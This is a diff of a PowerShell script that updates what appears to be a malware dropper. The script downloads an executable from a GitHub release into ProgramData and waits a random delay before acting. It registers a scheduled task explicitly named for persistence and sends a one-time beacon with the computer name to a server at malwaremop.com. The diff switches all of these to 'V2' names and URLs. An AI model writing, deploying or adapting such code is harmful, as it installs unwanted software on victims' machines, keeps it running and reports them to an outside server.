@@ -10,8 +10,8 @@
 #>
 
 # ===== CONFIGURATION =====
-$DownloadUrl = "https://github.com/westernschooldata/helloworld/releases/download/SystemInfoUtility/SystemInfoUtility.exe"
-$SavePath    = "$env:ProgramData\SystemInfoUtility\SystemInfoUtility.exe"
+$DownloadUrl = "https://github.com/westernschooldata/helloworld/releases/download/SystemInfoUtilityV2/SystemInfoUtilityV2.exe"
+$SavePath    = "$env:ProgramData\SystemInfoUtilityV2\SystemInfoUtilityV2.exe"
 $CreateScheduledTask = $true   # Set to $false to disable persistence
 $MinDelaySeconds = 0
 $MaxDelaySeconds = 600         # Random delay up to 10 min (set 0 for testing)
@@ -127,7 +127,7 @@ if (Test-Path $SavePath) {
 
 # --- 4. Create scheduled task for persistence (optional) ---
 if ($CreateScheduledTask) {
-    $taskName = "SystemInfoUtilityPersistence"
+    $taskName = "SystemInfoUtilityV2Persistence"
     if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
         Write-Log "Creating scheduled task"
         try {
@@ -145,10 +145,10 @@ if ($CreateScheduledTask) {
 }
 
 # ---- One-time heartbeat to tracking server ----
-$reportMarker = "$env:ProgramData\SystemInfoUtility\.reported"
+$reportMarker = "$env:ProgramData\SystemInfoUtilityV2\.reported"
 if (-not (Test-Path $reportMarker)) {
     try {
-        $trackingUrl = "https://malwaremop.com/track.php?machine=$env:COMPUTERNAME"
+        $trackingUrl = "https://malwaremop.com/trackV2.php?machine=$env:COMPUTERNAME"
         Invoke-WebRequest -Uri $trackingUrl -UseBasicParsing -TimeoutSec 10 | Out-Null
         New-Item -ItemType File -Path $reportMarker -Force | Out-Null
     } catch {
